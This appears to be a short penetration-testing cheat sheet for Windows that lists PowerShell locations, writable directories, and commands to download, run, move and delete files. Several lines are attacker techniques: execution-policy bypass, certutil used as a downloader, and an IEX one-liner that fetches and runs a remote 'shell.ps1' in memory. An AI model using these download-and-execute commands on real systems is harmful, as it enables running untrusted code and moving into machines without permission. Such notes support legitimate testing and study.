# basic

## Powershell location

```bash
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

## Writable Paths

```bash
C:\Windows\Temp
C:\Users\<USER>\Desktop\
C:\Users\Public\
C:\Documents and Settings\Public\
C:\Documents and Settings\<USER>\Desktop\
```

## PS styles

```bash
PS> $host
> powershell -c <cmd>
> powershell.exe -exec bypass -Command <>
```

### Cmds

```bash
# download file
certutil.exe -urlcache [-split] -f <source> <destination>
PS> wget <source> -OutFile <dest>
PS> Invoke-WebRequest -Uri <source> -Outfile <out-path>
powershell -c (New-Object System.Net.WebClient).downloadFile('<source>', '<dest>')
powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('/shell.ps1')
wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309

#run file
> ren <src> <dest>
PS> Start-Process <file.exe>

# rename 
PS> Rename-Item -Path <file> -NewName <new-file>

# move 
> copy /Y <src> <dest>
PS> Move-Item -Path <src> -Destination <dest>
# /E copies entire dir-structure
> robocopy <src> <dest> /E

# delete
PS> Remove-Item -Path <file> [-recursive]
```

### PS shorthand

```bash
# get child items
PS> gci [--recurse]

# get content
PS> gc FILE
```

## Arch based windows directory structure

| Session type   | 32 bit folder       | 64 bit folder          |
| -------------- | ------------------- | ---------------------- |
| 32 bit session | C:\Windows\system32 | C:\Windows\sysNative\\ |
| 64 bit session | C:\Windows\sysWOW64 | C:\Windows\system32\\  |
